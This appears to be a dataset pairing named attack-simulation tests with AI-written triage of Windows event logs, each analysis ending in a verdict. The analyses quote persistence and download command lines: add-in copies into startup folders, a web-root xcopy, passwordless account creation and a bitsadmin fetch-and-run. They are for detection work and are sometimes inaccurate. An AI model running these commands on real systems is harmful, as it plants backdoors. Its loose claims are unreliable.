- **SUSPICIOUS** - While many activities appear to align with legitimate administrative actions, the credential validation failures and unidentified registry modifications introduce concerns that warrant further examination. 

### Guidance
- Investigate the source of the credential validation failures, possibly reviewing access logs or external logs (if available) related to the user `02txoixylodcstop`.
- Examine the contents of the registry file being imported and ensure it aligns with legitimate and authorized changes.
- Cross-verify normal and scheduled update activities to ensure they match with the frequency of Edge Update process executions.
- Conduct a threat hunt for persistence mechanisms if not already in place utilizing tools like Sysinternals Autoruns, which complement log analysis beyond the existing entries.

These steps would help confirm the nature of the activities observed and assure the system has not been compromised."
Persistent Code Execution Via Excel Add-in File (XLL),"Upon reviewing the provided event logs, here is a detailed analysis:

### Analysis of Logs:

**1. Windows PowerShell Logs:**
   - The PowerShell script execution involved creating an Excel COM object and conditionally copying an Excel Add-In (""notepad.xll"") to the Microsoft Office Add-Ins directory. 
   - Furthermore, it modifies the Excel registry settings to include this Add-In upon startup.
   - The script also attempts to determine the bitness of Microsoft Office (32-bit or 64-bit) and acts accordingly.
   - This behavior is unusual as it seeks to persist a potential harmful Add-In through registry modifications, making it execute every time Excel is launched by the user.

**Indicators in Sistation.Unix Environment:**
   - ""Remove-Item"" is used to alter registry settings silently which is typically used to avoid detection.
   - The script attempts to execute Excel using the `Start-Process` cmdlet after these modifications.

**2. Sysmon Logs:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` are noted, which is normal as it's related to Microsoft Edge’s update services.
   - PowerShell activity (`powershell.exe`) executed by the user `SERVER002\\admin_test` aligns with the suspicious PowerShell activity described above.
   - The command line used for PowerShell (from later events) corroborates the Automation through Excel; it's the exact same command lines seen in PowerShell logs.

### Assessment:

**Suspicious Activity Detected:**
- The PowerShell script targeting Excel’s registry settings with an unconventional add-in (.xll file type is often used in Excel-based malware attacks) is unusual and points towards an attempt at persistence or execution of unauthorized code via Excel.
- This activity is not associated with standard operational behavior and could signify the potential compromise stemming from unauthorized script execution intended to manipulate Microsoft Office applications.

### Resolution: SUSPICIOUS

### Recommendation:
- **Further Investigation:** Trace the origin of the PowerShell script and cross-reference with any external communication logs for potential data exfiltration or malicious communication.
- **Endpoint Security:** Implement logging and monitoring solutions to alert on similar unauthorized PowerShell executions.

- **Preventive Measures:** Educate staff on phishing risks, as these are common vectors for such scripts being initiated.
- **Immediate Action Required:** Review and revert registry changes, inspect the copied ""notepad.xll"" file, and assess whether it matches any known malicious signatures. Also verify the integrity of Office installations and check for unauthorized installations of add-ins."
Create a new account similar to ANONYMOUS LOGON,"After analyzing the provided Windows event logs, the following points summarize the observations and conclusions regarding potential malicious activity:

1. **Suspicious User and Process Activity:**
   - **Command Execution with Elevated Privileges:**
     - There are multiple instances of `cmd.exe` being executed with the command-line arguments to create a new user account `ANONYMOUS LOGON` with the password `data_pass123!` in the domain context. This is a strong indicator of unauthorized account creation and is suspicious, as it suggests an attempt to establish persistence or enable lateral movement within the network.
     - Associated processes include executions of `net.exe` and `net1.exe`, both involved in user account management, which further confirm the attempt to create a new user.
     - These actions are executed by the user `SERVER002\\admin_test` and a high integrity level, indicating potentially compromised administrative credentials.

2. **Time Manipulation:**
   - There are events related to time changes (Event ID 4616 from Security logs and related Kernel-General events) which may be indicative of attempts to cover tracks, as time manipulation is often used to confuse logs and timelines during forensic investigations.

3. **Use of Built-in Windows Tools:**
   - The execution of built-in Windows utilities like `whoami.exe` and `wevtutil.exe` is observed but could be routine. However, in combination with other activities, they might be used by an attacker for reconnaissance or log manipulation purposes.
   - The `wevtutil.exe` utility is frequently used in scenarios where attackers attempt to clear or export event logs.

4. **Network and System Processes:**
   - The execution of processes such as `svchost.exe` and `taskhostw.exe` seems routine, primarily running under system accounts and generally not suspicious when observed alone. Their occurrence in the logs aligns with regular system operations.

**Conclusion:**
The log analysis reveals activities, notably unauthorized account creation using elevated command-line operations, which are robust indicators of potentially malicious behavior. These logs suggest that an attacker with administrative access attempted to create a new domain user account, possibly for persistent access. 

**Resolution: MALICIOUS**

- **Immediate Actions:**
  - Revoke access and reset the credentials of the `admin_test` account to prevent further unauthorized activities.
  - Examine and secure other accounts on the system to ensure no backdoor accounts have been successfully created.
  - Isolate the system (Server002) from the network to prevent potential further lateral movement.
  
- **Further Investigation:**
  - Conduct a full forensic analysis of the system to determine the extent of the compromise.
  - Review logs from other systems within the network to identify additional indicators of compromise or lateral movement.
  
- **Preventive Measures:**
  - Enhance logging and monitoring, focusing on user account activities and administrative actions.
  - Implement tighter access controls and consider deploying multi-factor authentication for administrative accounts.
  - Educate users on recognizing and reporting suspicious activity, particularly concerning user account management and privilege escalation attempts."
Install MS Exchange Transport Agent Persistence,"After reviewing the provided Windows event logs across different channels (Application, Security, Windows PowerShell, Sysmon, and System), here's a detailed analysis:

### Examination and Findings:

1. **Application Log:**
   - The event from the ""Software Protection Platform Service"" (EventID 16384) at first glance does not suggest any malicious activity. It's typical of system operations related to licensing.

2. **Security Log:**
   - **Privileged Logon (EventID 4672):** The `admin_test` account receives special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. These privileges allow significant control over the system and are generally legitimate for admin accounts but warrant further scrutiny if unexpected.
   - **Logon Event (EventID 4624):** This successful logon via NTLM indicates remote access from a workstation (`DESKTOP-3HL5B2P`), which is consistent through other events at approximately the same time.
   - **Logoff Event (EventID 4634):** A logoff event also aligns with the logon actions.

3. **Windows PowerShell Log:**
   - The execution of a PowerShell command involving the `Install-TransportAgent` command and enabling a transport agent concerning Exchange server operations is noted. This is not inherently malicious but should be verified to ensure it is approved and expected behavior on this server.

4. **Sysmon Log:**
   - **Multiple Instances of PowerShell (EventID 1 and 5):** Frequent launches of `powershell.exe` are noted, particularly with high integrity levels and command executions related to Exchange server. While not inherently malicious, PowerShell can be used for automation and administration, but it is also commonly exploited in attack scenarios. These require validation with expected administrative activity.
   - **Service Installation and Update processes for Microsoft Edge:** This is routine for systems where Microsoft Edge is installed.
   - **Processes Executed by `admin_test`**: Includes activities involving `whoami.exe`, `wevtutil.exe`, and several instances of `powershell.exe`. While powerful, it should be cross-referenced with expected tasks for this user account.

5. **Command Line and Process Execution:**
   - Commands executed display legitimate software (mostly Microsoft related) and are executed by known processes. However, they should match documented or expected software installation or update operations.

### Assessment:

- **Suspicious Activities:**
  - The frequency and nature of PowerShell executions, especially sensitive privileges granted to `admin_test`, require further investigation. Particularly, the use of privileges like `SeDebugPrivilege` indicates potential for actions beyond normal administration.
  - The usage of `whoami.exe` could indicate checking active user permissions, often seen in reconnaissance steps of an attack pattern.

### Resolution:

- **SUSPICIOUS**: The activities contained in the logs show legitimate actions but involve elevated privileges and frequent PowerShell use, which could be indicative of unauthorized access or preparation for privilege escalation. There is insufficient explicit evidence of malicious intent, but these should be corroborated with authorized administrative activities.

  - Ensure that all administrative accounts have appropriate alerts for suspicious activity.
  - Enforce the principle of least privilege and regularly review accounts with elevated privileges.
  - Regularly audit and update security policies to anticipate potential misuse of elevated privileges."
"Persist, Download, & Execute","### Detailed Analysis of Windows Event Logs

#### Anomalous and Suspicious Activities:

1. **Event ID 1 - Process Creation:**
   - There is a series of events involving `cmd.exe` execution with `bitsadmin.exe`. The command line shows the creation of a download job via BITS (Background Intelligent Transfer Service) using `bitsadmin.exe` that downloads a file from what seems an external URL (`https://raw.githubusercontent.com/file/file-file/master/files/data/data.md`) into the `%temp%` directory, and configures `notepad.exe` as a notification command. This behavior can indicate a potential file download followed by execution which is often used in malicious scenarios.
   
   - The `cmd.exe` command line involves potentially suspicious parameters and actions designed to download and execute a script or file. Although `bitsadmin.exe` is a legitimate Windows utility, it can be repurposed by attackers for malicious activities such as downloading malicious scripts or files.

2. **Privilege-Related Security Events (Event ID 4672):**
   - Regularly, elevated privileges such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, etc. are observed being assigned to `admin_test` which leverages the privileges to conduct system-level activities. This includes debugging, impersonation, backup, and restore rights. While this might be typical for administrative tasks, coupled with suspicious activities, these events could signify an abuse of privileges.

3. **Time Manipulation (Security Event ID 4616, Kernel-General Event ID 1):**
   - Events indicate that the system time was altered. Time manipulation can be used to disrupt log timelines or facilitate other unauthorized actions suspiciously. However, without more context on the reasoning, it can also be legitimate.

4. **Event ID 5 - Process Terminations:**
   - The termination of `svchost.exe` and initiation of numerous command line utilities (`conhost.exe`, `wevtutil.exe`) which may indicate legitimate administrative tasks or an attempt to cover tracks and terminate critical services to avoid detection.

5. **Edge Update Logs:**
   - The system executed commands relating to updating Microsoft Edge which reflects regular scheduled update activity. However, the volume, frequency, and quick succession of these events within the log timeframe can be slightly unusual in a non-update period but is not necessarily an indicator of compromise.

#### Assessment:

The activities observed reflect a higher than normal frequency of potentially suspicious behaviors centering around:
- Use of `bitsadmin.exe` for file download and execution potentially indicating a staged attack.
- High-level privileges use which in a normal environment may represent legitimate administrative activities, however under unusual scenarios could signal an intrusion or abuse of privileges.

### Resolution: **SUSPICIOUS**

This assessment requires further investigation due to the presence of suspicious command executions and privilege usage. Although no concrete maliciousness can be 100% confirmed from the logs alone, the behavior suggests a need for:
- Analysis of external connections and downloaded files for malicious patterns.
- Verifying the authenticity of the BITS jobs and the legitimacy of involved URLs/actions.
- Checking for additional suspicious activities and potential indicators of compromise.
  
### Recommendations:
1. **Enhanced Monitoring:**
   - Continue to monitor for further suspicious activities, focusing on network connections, file system changes, and high-privilege operations.

2. **Conduct a Threat Hunt:**
   - Engage in proactive investigations surrounding similar processes, URLs, or file origin, potentially with threat intelligence integration.

3. **Confirm External Communications:**
   - Review logs and network traffic data to ensure outgoing communication does not correlate with known malicious entities or IPs.

Given this suspicious rating, further inquiry and validation of the system's integrity and activity contexts are necessary to make a decisive determination."
Windows MOFComp.exe Load MOF File,"After a thorough review of the provided Windows event logs, I identified the following points that suggest suspicious or potentially malicious activity:

1. **PowerShell Execution**: There are several instances of PowerShell being executed with the command `powershell.exe & {c:\windows\system32\wbem\mofcomp.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src\data.003.mof""}`. PowerShell is a powerful scripting language and can be used for both legitimate administrative tasks and malicious activities. The execution of a MOF (Managed Object Format) file in this context, particularly from a temporary directory, is unusual and warrants further investigation.

2. **Event Logs and Process Monitoring**: The frequent use of `wevtutil.exe` and `conhost.exe` might indicate an attempt to clear event logs or manipulate console sessions. Though these tools can be used for legitimate administrative purposes, in combination with PowerShell executing scripts from suspicious locations, this behavior appears more suspect.

3. **Unusual WMI Activity**: An error was recorded in the Application log indicating a WMI query failure related to `notepad.exe`. WMI is often used by attackers to monitor system processes or execute malicious payloads. This query attempt, albeit unsuccessful, indicates potential exploratory actions by an attacker.

4. **Microsoft Edge Update Activity**: There are numerous entries related to `MicrosoftEdgeUpdate.exe` processes. While updates for applications like Edge are typical, the logs show these executables and services being launched from a temporary directory. This behavior can be normal for update processes employing temporary folders, but combined with other anomalies, it should be verified.

5. **Lack of Security Log Details**: An absence of entries in the Security log can sometimes suggest tampering or that logging is not configured correctly, leaving the system blind to important security events.

Based on the provided data, the activities involving PowerShell and the MOF file stands out as the most concerning aspect of this analysis. Combined with the attempted WMI query and the frequent calling of `wevtutil.exe`, these actions could indicate preparation for persistence or reconnaissance.

**Assessment: SUSPICIOUS**

**Recommendations:**
- Further investigate the contents and origin of the `data.003.mof` file. Verify its purpose within the system and check for other anomalous files or scripts.
- Review PowerShell logs and any associated scripts for unauthorized access attempts or changes.
- Ensure security logging is comprehensive and regularly backed up to prevent tampering.
- Investigate the context and necessity of the Microsoft Edge update process. Verify its legitimacy by comparing the hashes of the executables against known-good versions.
- Increase monitoring for further suspicious behavior using EDR (Endpoint Detection and Response) solutions.

To ensure safety and forestall any potential threats, these anomalies should be examined further by the security team, potentially involving incident response procedures."
Persistent Code Execution Via Word Add-in File (WLL),"Upon reviewing the provided logs, I conducted a thorough analysis and found several points of interest that suggest suspicious activities. Here's a breakdown of the findings:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Multiple instances of PowerShell running scripts that interact with Microsoft Word's startup folder were detected. Specifically, the script checks the installed Office version and copies add-in files (`wordwll_x64.wll` or `wordwll_x86.wll`) from a temporary directory to the Microsoft Word startup folder as `notepad.wll`.
   - The script stops and starts the WinWord process. Such behavior is indicative of potential persistence mechanisms or malicious macro insertions, commonly seen in malware delivery tactics.

2. **Use of System Processes:**
   - There are records of processes like `wevtutil.exe` being launched. While not inherently malicious, `wevtutil.exe` (Windows Event Utility) can be used to clear or modify event logs - actions often taken by malware to cover tracks.
   - The `conhost.exe` also appears alongside suspicious scripts which can be a way to hide command line interfaces.

3. **System Activity Involving Microsoft Edge Update:**
   - Multiple Sysmon entries point to various operations involving `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` executing under NT AUTHORITY\SYSTEM. This typically relates to legitimate update operations; however, the frequency and pattern could suggest its use in executing unauthorized tasks or as a part of a malicious payload deployment system.

4. **Command Line Execution Contexts:**
   - Execution of `whoami.exe` and `hostname.exe` under high integrity level context and without an apparent legitimate task purpose can be indicative of environment reconnaissance actions often performed in the early stages of a breach.

### Assessment:

The PowerShell script activities are a significant cause for concern due to:
- The copying of files into Microsoft Word startup, aiming potentially for persistence or malicious execution posing as notepad extensions.
- The overlapping times of process executions including system tools like `whoami`, `conhost`, and `wevtutil` naturally linked to adversarial lateral movement or privilege escalation activities.

Based on the analysis, I am leaning toward a compromise in progress or preparation. The actions recorded do not align with typical administrative activity and represent behaviors associated with malicious intent, particularly around the PowerShell usage and the potential manipulation of Word environment for persistence.

### Resolution:

**SUSPICIOUS** - The activity described needs further investigation. It is critical to check the integrity of the system, validate legitimate authorization for the administrative scripts, the reason behind their execution, and continuity of operations. Consider isolating the host if further evidence aligns with malicious behavior to prevent potential spread in the network. 

Follow-up actions should include:
- Investigating the Word add-ins and their origins.
- Checking for unauthorized scheduled tasks or registry entries indicating persistence.
- Reviewing network traffic from the machine for any indication of data exfiltration or remote access attempts."
Web Shell Written to Disk,"Upon examining the provided logs from the Application, Sysmon, and Windows PowerShell records, there are some notable points of interest:

1. **Use of PowerShell and wsmprovhost.exe**:
   - The Sysmon logs reveal the usage of `powershell.exe` by the user `SERVER002\admin_test`. PowerShell is a powerful command-line tool that can be used both legitimately and maliciously.
   - The `wsmprovhost.exe` is the Windows Remote Management host process and is commonly used in remote management scenarios. It served as the parent process for several command executions (e.g. running `hostname.exe`, `whoami.exe`).

2. **Execution of Command-Line Utilities**:
   - Observed processes like `cmd.exe` running commands such as `xcopy`. The command was executed with parameters `/c xcopy /I /Y ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src"" C:\inetpub\wwwroot`. This indicates a file copy operation to a potentially sensitive web directory (`inetpub\wwwroot`). This could be indicative of a script or task aimed at deploying content or making changes to a web server.

3. **Multiple Executions of Microsoft Edge Update**:
   - Various instances of `MicrosoftEdgeUpdate.exe` are logged with different command-line arguments. While regular updates via such executables are normal, the frequency and pattern might require validation to ensure that these updates were legitimate and expected.

4. **High Integrity Level Executions**:
   - Majority of the processes, particularly `cmd.exe`, `xcopy.exe`, and other system utilities were run with a High integrity level, which means they were executed with elevated permissions.

5. **Lack of System Logs**:
   - The absence of detailed System and Security logs makes it difficult to correlate the behavior noted in the Sysmon logs with any additional logs that might show abnormal network activity, failed/successful logins, or other security-relevant events.

**Assessment:**

- **Suspicious Behavior**: 
  - The series of executions involving the copying of files to the web server directory, use of PowerShell, and the lack of additional context from system and security logs suggest unusual behavior. 

- **Security Implications**:
  - An attacker could potentially use these tools and commands to exfiltrate data, establish persistence, or prepare for further intrusive actions such as deploying web shells.

**Recommendations:**

1. **Further Investigation**:
   - Review the source and destination files involved in the `xcopy` operation.
   - Verify the legitimacy of the PowerShell commands and their intended purpose.
   - Ensure that the Microsoft Edge updates and associated commands were sanctioned as part of regular update operations.
   
2. **Enhanced Monitoring**:
   - Implement improved monitoring on activities that involve elevated permissions.
   - Set up alerts for sensitive directories and critical command usage patterns.

3. **Logs Review and Correlation**:
   - Acquire and analyze additional system and security logs for the same timeframe for more comprehensive context.

Based on the above findings, the situation should be classified as **SUSPICIOUS**. Further investigation is required to fully assess the extent and intent of these activities."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"After a detailed review of the provided event logs, I have identified several points of interest:

### Application Logs
- **Sysmon.exe Crashes**: There are multiple entries related to `Sysmon.exe` crashing with an exception code `c0000005`, which typically indicates an access violation. This may suggest a software issue or potential tampering, but by itself, it is not conclusive of malicious activity.
- **Edge Update Service Stopped**: There is an entry for the Edge Update service being stopped, but no further context is available to determine if this behavior is suspicious alone.

### Windows PowerShell Logs
- **Suspicious PowerShell Activity**: Entries indicate the execution of a PowerShell script involving WMI event subscriptions (EventID 600). Such activity is commonly used for persistence mechanisms by malware. The script attempts to run `notepad.exe` using WMI event consumers, which is unusual and could suggest malicious intent if `notepad.exe` is a placeholder for other dangerous actions.

### Sysmon Logs
- **Process Creation and File Hashes**: Various benign processes like `hostname.exe`, `whoami.exe`, `wevtutil.exe` have been executed. The SHA256 hashes indicate that these are likely legitimate versions of the binaries.
- **PowerShell Execution**: Detailed data on PowerShell execution (EventID 1) confirms the suspicious activity noted in the PowerShell logs. The command line used matches the pattern often seen with malicious persistence scripts.
- **WerFaultSecure.exe Activity**: This is a legitimate process for handling Windows fault reporting, making its presence expected during crash reports. However, its heavy activity correlating with Sysmon crashes could require closer scrutiny.

### Security Logs
- **High Privilege Logons**: Logged activities show multiple privileged operations (EventID 4672) by `admin_test`. While these privileges are necessary for some administrative functions, their usage warrants careful monitoring, particularly in the context of other suspicious activities.
- **Credential Validation Failures**: There are several credential validation failure events (EventID 5379), which might suggest unsuccessful attempts to access certain resources, possibly pointing to unauthorized access attempts.

### Assessment
* **Suspicious Behavior Detected**: The presence of unusual PowerShell scripts involving WMI, combined with Sysmon crashes and high privilege logons, raises concerns about potential malicious activity. The full execution context and intent of the PowerShell script need to be verified.

### Recommendations
1. **Investigate PowerShell Activity**: Examine the PowerShell script further to understand its purpose, especially the sections involving the `Set-WmiInstance` calls.
2. **Review Sysmon Configuration**: Check the Sysmon configuration and system logs for potential tampering or misconfigurations that could have led to the crashes.
3. **Monitor Privilege Use**: Ensure that all privileged actions taken by `admin_test` are authorized by reviewing access policies and interviewing the user if required.
4. **Audit Credential Failure Logs**: Investigate the repeated credential validation failures to rule out any unauthorized access attempts.

### Resolution
Based on the analysis, the situation aligns with a **SUSPICIOUS** status. The activities are not definitively malicious but warrant deeper investigation to ensure system integrity and security."
Persistent Code Execution Via Excel VBA Add-in File (XLAM),"### Analysis of Windows Event Logs

The Windows event logs provided contain several entries from Sysmon, Application, and PowerShell logs. Here's a detailed assessment:

#### **Sysmon Logs Analysis:**

1. **Process Creation Events:**
   - Multiple Sysmon event IDs `1` and `5` indicate the creation and termination of processes. The most notable processes are `powershell.exe` and `conhost.exe`. These are legitimate system processes; however, their context of execution must be scrutinized.
   - **Powershell Execution:** We see `powershell.exe` being executed by the user `SERVER002\admin_test` with the command line `Copy ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam"" , Start-Process ""Excel""`. This command indicates an attempt to copy an Excel VBA add-in to a startup folder, which could be used to persist malware.

2. **Unusual Activity with **PowerShell**:**
   - The execution of a suspicious PowerShell command that attempts to copy a file to the Excel startup folder is particularly concerning, as it may suggest an attempt to leverage Excel to execute arbitrary code or a macro whenever Excel is opened. This is a common technique used in various malware campaigns to establish persistence.

#### **Application Log Analysis:**

- The logs are from `edgeupdate` indicating routine updates and service stops, which appear benign in nature and typical for Microsoft Edge Update operations.

#### **PowerShell Logs Analysis:**

- The PowerShell logs record the execution context of the PowerShell command. The warning message about failure to copy suggests the job may not have completed successfully. However, the fact that this script was initiated and attempted indicates the possibility of malicious intent.

### Assessment:
- **Suspicion of Malicious Activity**: The use of PowerShell to copy a file to Excel's startup folder and execute Excel suggests an attempt to abuse the legitimate application for potentially malicious purposes. This behavior is characteristic of malicious activity aiming at persistence or automated execution.
- **Successful Privilege Access and Execution**: Despite an error in copying, the execution of PowerShell and the pattern of use suggests potentially elevated permissions might have been exploited or misused.

### Recommendations:

1. **Immediate Investigation:** This activity should be classified as **SUSPICIOUS** and requires further investigation.
   - Investigate the origin and legitimacy of the PowerShell command. Check for any other scripts or scheduled tasks that relate to this activity.
   - Perform a complete scan for potential indicators of compromise across the network, focusing on other instances of unauthorized copies or Excel executables in startup locations.

2. **Strengthen Monitoring:** Enhance logging and monitoring around PowerShell executions and processes that are known vectors for script-based attacks.

3. **Validate Security Controls:** Ensure that security mechanisms such as application whitelisting, Endpoint Detection and Response (EDR), and enhanced monitoring for high-risk operations are properly configured.

In conclusion, while there's no definitive harmful payload displayed in these logs, the specific PowerShell activity raises enough concern to warrant further investigation to ensure there isn't an ongoing or future compromise. Adopting strict security practices and immediate containment measures is prudent."
Google Chrome Load Unpacked Extension With Command Line,"After a thorough analysis of the provided Windows event logs, several activities were observed that may require further scrutiny. Here’s a breakdown of findings:

1. **Processes and Commands**: 

   - The use of `wevtutil.exe` is logged multiple times, suggesting manipulation or querying of event logs, which although can be legitimate, is a common step in evading detection by clearing event logs.
   - PowerShell activity was recorded (`powershell.exe`) with a complex script for downloading and manipulating Chromium browser updates along with a browser extension. This could indicate an attempt to sideload a potentially malicious extension, especially as it involves downloading from URLs directly via command-line.

2. **Unexpected Software Usage**:

   - The command-line activity in PowerShell shows downloading Chromium browser directly from its build server and a specific uBlock Origin extension from GitHub for Chromium. This raises flags as it involves downloading and executing remote content without direct user interaction, aligning with potential malware delivery techniques.
   
3. **Parent-Child Process Relationships**:

   - The execution of `Hostname.exe` and `Whoami.exe` under legitimate parent processes does not inherently indicate malicious activity. However, these tools can be leveraged for reconnaissance and gaining information on the system environment.
   
4. **Integrity Levels and User Context**:

   - Many of these operations, including `powershell.exe`, are executed at high integrity levels under the `admin_test` user. This means the operations have significant privileges on the machine, increasing potential risk.
   
5. **Edge Update Activity**:

   - Frequent appearance of Microsoft's `EdgeUpdate` could be routine; however, we’ve observed multiple instances and modifications suggesting potential modification or misuse.

6. **Network-related Tasks**:

   - WmiPrvSE.exe under NETWORK SERVICE suggests remote management, which is legitimate under specific operations but requires verification with allowed operations context.

Given these observations, the activities warrant further investigation rather than immediate classification as benign or definite malicious activity. The command-line script execution in PowerShell and excessive and rapid querying and manipulation of event logs are particularly concerning.

**Resolution**: 

- **SUSPICIOUS**: There are activities that deviate from normal user and system behavior, particularly in terms of repeated event log manipulations and the use of PowerShell for downloading and executing files and extensions. Further investigation is required to determine the legitimacy or malicious nature of these activities. This should include:
  - Contextual investigation into the necessity and frequency of these PowerShell scripts.
  - Examination of network logs and user activity logs to correlate these findings with user behavior.
  - Review of security patches and updates related to event log and PowerShell operations to ensure no vulnerabilities are being exploited."
Auto-start application on user logon,"Upon analysis of the provided logs, several observations can be made:

1. **Application Log**:
   - The logs show events related to the `Software Protection Platform Service` and the stopping of `edgeupdate`. EdgeUpdate stopping is a normal behavior related to Microsoft Edge's update service and typically doesn’t indicate malicious activity.

2. **System Log**:
   - Events related to time adjustments (`EventID 24` and `EventID 1`) are logged, which appear to be related to time synchronization activities by the Windows Time Service and Kernel. These are common and usually benign.

3. **Sysmon Log**:
   - Multiple instances of processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `reg.exe` and services under `NT AUTHORITY\SYSTEM` are seen. These processes have legitimate uses; however, several entries stand out due to suspicious command executions:
     - **`cmd.exe` registry modifications**: Command to add entries to the registry for `malware_test` under Accessibility features. Such registry additions to executables can be indicative of persistence techniques used by malware, especially when setting configurations that can execute a process automatically or interfere with system behavior.
     - The presence of registry modifications that include the execution of `cmd.exe` upon certain triggers is suspicious and can indicate a potential backdoor or persistence mechanism.
   - Execution of `whoami.exe` and various `EdgeUpdate` activities seem benign, relating to system updates and user verification, unless tied more closely to a specific malicious operation or context.

4. **Security Log**:
   - Similar to the system log, it logs time changes. Although such changes are largely benign, they can sometimes indicate anomaly if unauthorized or tied with payloads that manipulate time-based functions.

### Conclusion:

The critical activity is the logged execution of command lines via `cmd.exe` that add registry keys under unusual contexts—specifically the `malware_test` registry manipulation. These actions strongly correlate with potential malicious activity aimed at maintaining persistence in the system.

### Resolution: **MALICIOUS**

### Guidance:
- **Immediate Action**: 
  - Investigate the origin of the command executing these registry keys.
  - Check for unauthorized users or systems performing unexpected registry modifications.
  - Isolate the system from the network until further thorough analysis and cleanup are performed.
  - Use approved security tools to scan for known malware or indications of compromise.
  
- **Post-Incident**: 
  - Review security policies related to script execution and administrative access.
  - Harden systems against unauthorized registry edits by limiting permissions.
  - Ensure regular monitoring and alerting on critical operations such as registry edits indicative of persistence mechanisms."
Append malicious start-process cmdlet,"Upon analyzing the provided logs, let's break down potential indicators of malicious activity within each log category:

### Windows PowerShell Log Analysis
- **Suspicious Command**: The PowerShell logs indicate a command executed that adds content to a PowerShell profile to automatically start `calc.exe`, a standard executable (Calculator). The command also exits the PowerShell session. While launching the calculator in itself is not malicious, the method of execution is abnormal. This could represent a test or a proof of concept exploit rather than a serious attack.
- **Persistent Execution**: The addition of content to a PowerShell profile suggests an attempt to establish persistence, which can be a tactic used in malicious campaigns.

### Security Log Analysis
- **Repeated Logon Events (4624)**: These log events indicate logon sessions, primarily for system accounts (`SYSTEM` and `SERVER002$`) and not for interactive logins, which is standard behavior for services.
- **Special Privileges Assigned (4672)**: This is a standard informational event indicating privileges have been assigned during a logon session, typically seen with system or administrative accounts.
- **Could Not Log Credentials (5379)**: Events indicate failed attempts to log on using a Microsoft account, which however returned a code indicating failure.
- **Query for Local Users (4798)**: This suggests enumeration activity against local user accounts. While it might be legitimate for administrative tasks, combined with other activities, it could indicate reconnaissance.

### Application Log Analysis
- **Service Stop**: Log entries indicate routine stopping of the `edgeupdate` service, which is typical behavior.

### Sysmon Log Analysis
- **Suspicious Execution of PowerShell**: Sysmon shows PowerShell execution with the command similar to those seen in PowerShell logs, primarily focused on modifying profiles to launch calc.exe automatically.
- **Logged Process Execution**: Multiple Sysmon entries record detailed process execution (like `MicrosoftEdgeUpdate`, `whoami.exe`, etc.) in high integrity, indicating routine operations in a Windows environment.

### Analysis Summary:
1. **PowerShell Execution**: The modification of the PowerShell profile to launch `calc.exe` upon opening of PowerShell, while not inherently harmful, indicates an unusual usage pattern that can be a sign of testing or potential compromise tactics.
   
2. **User Enumeration**: Security logs showing user account enumeration (event ID 4798) may hint at reconnaissance activities. While these activities by themselves aren't damaging, in conjunction with other signs, they suggest potential misuse of privileges or preparation for further activities.

3. **Failed Credential Access**: Event 5379 logs showing failed credential access using non-Windows accounts could suggest attempts to pivot to remote accounts or exploit existing credentials.

Considering all the above points, the situation in logs can be categorized as:

### Resolution: SUSPICIOUS
Given the PowerShell persistence attempt, account enumeration activity, and the potential (unfulfilled) credential actions, further investigation into the changes made and user activities on this system would be warranted. Specifically:
- **Examine User Accounts and Profiles**: Monitor any further changes to user profiles and PowerShell scripts.
- **Audit Administrator Actions**: Identify if the account performing these commands had legitimate reasons.
- **Network Monitoring**: Ensure network traffic is analyzed for anomalous patterns that could suggest data exfiltration or other unauthorized access.

Further steps should involve securing the system, auditing recent changes, and checking for any unauthorized access or modifications by non-administrative users."
Create a new user in PowerShell,"**Detailed Analysis of Windows Event Logs**

**Suspicious or Anomalous Behavior Identified:**

1. **Creation of Local User:**
   - A PowerShell command was executed to create a new local user named `""data.001_PowerShell""` with no password using the command: `powershell.exe & {New-LocalUser -Name \""data.001_PowerShell\"" -NoPassword}`.
   - This action is suspicious as the creation of a user account without a password could be indicative of unauthorized access or backdoor creation.

2. **User Account Creation and Modification Events:**
   - Security Event ID 4720 indicates a new user account `""data.001_PowerShell""` was created.
   - This account was added to a group (Event ID 4728) and enabled (Event ID 4722) shortly after its creation. Event ID 4738 confirms the modifications.
   - The rapid sequence of creation and group manipulation is anomalous for standard operations, especially with no password set.

3. **Time Discrepancies:**
   - Security Event ID 4616 shows system time adjustments, which can be a tactic used by attackers to manipulate time-based security controls or logs.

**Indicators of Potential Malicious Activity:**
- The creation of a user account via PowerShell and assigning it no password could indicate an attempt to establish persistence or unauthorized access.
- The activity was executed under the user `admin_test`; however, if this was not authorized, it might indicate credential compromise.
- The presence of high-privilege operations shortly after logon (EventID 4672) under the `admin_test` account supports suspicious actions requiring administrative rights.

**Assessment & Threat Level:**
- The creation and enabling of a user account with no password is a significant indicator of potential malicious intent.
- The sudden system time change and use of administrative privileges post-login reinforce the risk level.
- These actions are likely unauthorized, warranting high suspicion.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Disable or delete the suspicious user account `""data.001_PowerShell""`.
   - Verify and potentially reset credentials for the `admin_test` account if unauthorized activity is suspected.
   - Review recent access logs and system changes for anomalies tied to `admin_test`.

2. **Further Investigation:**
   - Conduct a thorough audit of PowerShell logs for unauthorized script execution.
   - Review logs preceding and following the detected events for additional anomalies.
   - Assess the host for backdoors or other indicators of compromise.

3. **Preventive Measures:**
   - Implement robust monitoring for account creation and privilege assignment activities.
   - Use multi-factor authentication to harden access to administrative accounts.
   - Regularly train staff on secure script usage and account management practices.

Concluding, the events reviewed reflect enough suspicious activity to merit further investigation, although not conclusively proving malicious action without additional context or corroboration. This analysis should be escalated appropriately within the security team for remediation actions."
Bitsadmin Download (cmd),"Upon examining the provided Windows event logs, there are several details that stand out and indicate potentially suspicious or malicious activity:

1. **Use of BITSAdmin**: The logs show an execution of `cmd.exe` running BITSAdmin with the following command line: 
   ```
